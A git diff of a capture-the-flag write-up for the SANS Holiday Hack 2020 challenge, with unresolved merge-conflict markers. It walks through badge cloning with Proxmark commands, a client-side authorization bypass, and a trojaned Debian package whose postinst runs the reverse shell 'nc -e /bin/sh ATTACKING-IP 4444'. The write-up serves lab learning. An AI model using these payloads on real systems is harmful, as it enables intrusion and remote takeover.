@@ -30,15 +30,29 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 
 ![](screenshots/objective-1-completed.jpg)
 
+<<<<<<< HEAD
 **Answer:** "poxmark"
 
 - First stop in the Holiday Hack challenge! I talked to Jingle Ringleford and downloaded the billboard image.
 - I used the tool suggested in the hint. Took several attempts at twirling and untwirling before I could see what was on the list for him.
 - Once I saw what was on the list, I read it as "poxmark", but had no idea if this was a thing, so I googled it. YUP! A very interesting thing at that. :)
+=======
+**Answer:** "proxmark"
+
+This is the first stop in the Holiday Hack 2020 Challenge! Talk to Jingle Ringleford and download the billboard image. You may not be able to see the billboard at first. Try zooming out a bit in your web browser. Once you download the image, you'll see that it it is 'twirled'. Most bitmap image editors (Gimp, ImageMagick) will allow you to apply a twirling filter in reverse. I used the online application suggested in the hint. https://www.photopea.com/.
+
+I found it helpful to zoom in and then use the "Rectangle Select" tool. You can go right to "Filter >> Distort >> Twirl" once you have the area you'd like to focus on. It seems the best result comes when you try several different selected areas, starting from scratch each time. With every new selected area, see if the 'twirl' tool shows you some clarity right away. If it does, then you have only slightly more you need to do on the slider to see which item Santa plans to give Josh Wright. 
+
+![](screenshots/proxmark-smaller.png)
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 **Lessons Learned**
 
 - Photo obfuscation can actually be 'undone' in some cases.
+<<<<<<< HEAD
+=======
+- When working with image editing "distort" filter tools, picking the correct "selection" area is half the battle.
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 # Objective 2: Investigate S3 Bucket
 
@@ -48,6 +62,7 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 
 **Answer:** "North Pole: The Frostiest Place on Earth"
 
+<<<<<<< HEAD
 - Added wrapper3000 to the wordlist
 - Found this bucket (wrapper3000) and the file "package"
 - Now attempting to decompress the file
@@ -64,6 +79,26 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 
 **Lessons Learned** 
 
+=======
+- Step 1: Add "wrapper3000" to the wordlist
+- Step 2: Rerun the supplied tool with this updated wordlist
+	- wordlist is located here: "~/bucket_finder/wordlist"
+	- run the tool with this wordlist "~/bucket_finder/bucket_finder.rb wordlist"
+- Step 3: Find this bucket (wrapper3000) and the file "package"
+- <a href="http://s3.amazonaws.com/wrapper3000/package">http://s3.amazonaws.com/wrapper3000/package</a>
+- Step 4: "cat package" (and see that it was base64 encoded)
+- Step 5: "base64 -d package > package.zip"
+- Step 6: "unzip package.zip"
+- Step 7: "tar -xvf package.txt.Z.xz.xxd.tar.bz2"
+- Step 8: "xxd -r *.xxd > package.txt.Z.xz"
+- Step 9: "xz -d package.txt.Z.xz"
+- Step 10: "uncompress package.txt.Z"
+- Step 11: "cat package.txt"
+
+**Lessons Learned** 
+
+- Automation does wonders when comes time to look for publicly exposed s3 buckets.
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 - There may be more public buckets lurking than you realize. And, holy cow, there are lots of ways to compress files!
 
 # Objective 3: Point-of-Sale Password Recovery
@@ -106,7 +141,11 @@ Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
 Got some help from my kid on this one. :) 
 
+<<<<<<< HEAD
 ![](screenshots/elevator.png)
+=======
+![](screenshots/santavator.png)
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 **Lessons Learned**
 
@@ -118,6 +157,13 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 
 ![](screenshots/objective-5-completed.jpg)
 
+<<<<<<< HEAD
+=======
+Get this tool!
+
+![](screenshots/proxmark-cli.png)
+
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 - Step 1: Steal Shinny Upatree's ID, using "search lf" when standing next to him.
 - Step 2: Simulate the ID when you get to Santa's secret door in the workshop.
         - "lf hid sim -r 2006e22f13" 
@@ -138,7 +184,11 @@ Access the Splunk terminal in the Great Room. What is the name of the adversary 
 
 **Answer:** "The Lollipop Guild"
 
+<<<<<<< HEAD
 rake sure you are "Santa" when you attempt this objective.
+=======
+Make sure you are "Santa" when you attempt this objective.
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ## Question 1
 
@@ -425,7 +475,12 @@ pub/jfrost/backdoor/
 nc -e /bin/sh ATTACKING-IP 4444
 ~~~
 
+<<<<<<< HEAD
 - Step 8: Build the deb package with the above payload in the "postinst"
+=======
+- Step 8: Build the deb package with the above payload in the "postinst". *Note: that one payload line is ALL you need in the postinst file; nothing else!"*
+
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
@@ -476,7 +531,19 @@ Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's f
 
 *Note: You can't be in Santa mode when you complete this challenge. Santa already has access to his office. So you're not really defeating the fingerprint sensor when you're Santa. You're just using it as intended. Go to the Santa in the 'Entry' and switch back to being a normal user first.* 
 
+<<<<<<< HEAD
 This required going into developer mode in Google Chrome. I saw one spot where the 'besanta' token was a condition required for being able to go to floor three and deleted it. After doing this, you can save "app.js" and reload the elevator code in your browser. 
+=======
+This required going into developer mode in Google Chrome. I saw one spot where the 'besanta' token was a condition required for being able to go to floor three. Can I hack this on the client side? Yup!
+	
+- Step 1: Set a 'breakpoint' in developer mode where the code checks to see if you have the 'besanta' token.
+- Step 2: Now refresh your page and you'll land on the breakpoint when you click the fingerprint scanner.
+- Step 3: Here's your opportunity! Simply remove the **"hasToken('besanta')"** condition.
+- Step 4: Remember to save your changes right to the "app.js" file.
+- Step 5: Now resume code execution in developer mode and you float right on by the logic that checks if you are Santa!
+
+These were tricks I learned from a BBKing/Black Hills Information Security webcast. Highly recommend! 
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ![](screenshots/remove-besanta-condition.png)
 
@@ -562,11 +629,19 @@ Here's the final script that retrieves he predicted values:
 
 # Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2
 
+<<<<<<< HEAD
 ![](screenshots/objective-11b-completed.jpg)
 
 The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?
 
 Answer: **fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb**
+=======
+The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?
+
+![](screenshots/objective-11b-completed.jpg)
+
+**Answer:** fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 - Step 1: Create a script to show MD5 and SHA256 hashes on changes to the blockchain.dat file.
 
@@ -663,6 +738,7 @@ score:            4294967295
 previous hash:    4a91947439046c2dbaa96db38e924665
 hash:             347979fece8d403e06f89f8633b5231a
 
+<<<<<<< HEAD
 full hash:        
 b10b4a6bd373b61f32f4fd3a0cdfbf84 
 MD5 after changes (SAME AS BEFORE! COLLISION=SUCCESS!)
@@ -670,6 +746,19 @@ MD5 after changes (SAME AS BEFORE! COLLISION=SUCCESS!)
 full hash sha256: 
 fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb 
 SHA256 after changes and answer to objective!
+=======
+***********************************************************
++ full hash:                                              +
++ b10b4a6bd373b61f32f4fd3a0cdfbf84                        + 
++ MD5 after changes (SAME AS BEFORE! COLLISION=SUCCESS!)  +
+***********************************************************
+
+********************************************************************
++ full hash sha256:                                                +
++ fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb +
++ SHA256 after changes and ANSWER to objective!                    +
+********************************************************************
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ~~~
 
@@ -707,6 +796,10 @@ All the rotting, plotting, low conniving streaming from that skull.
 Holiday Hackers, they're no slackers, returned Jack a big, old null!
 ~~~
 
+<<<<<<< HEAD
+=======
+![](screenshots/balcony.png)
+>>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 # Challenges
 	
